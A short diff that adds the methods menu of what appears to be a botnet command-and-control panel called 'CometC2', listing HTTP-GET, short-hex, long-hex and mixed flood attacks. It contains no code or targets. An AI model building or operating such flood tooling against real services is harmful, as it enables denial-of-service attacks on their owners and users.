@@ -1,0 +1,9 @@
+<r>*───►* CometC2 Methods*:*<r><n>
+    *►* http*:*<r><n>
+        *~>* Raw http-get flood<r><n>
+    *►* std*:*<r><n>
+        *~>* Short-Hex string flood<r><n>
+    *►* hex*:*<r><n>
+        *~>* Long-Hex string flood<r><n>
+    *►* mix*:*<r><n>
+        *~>* STD+HEX flood<r><n>
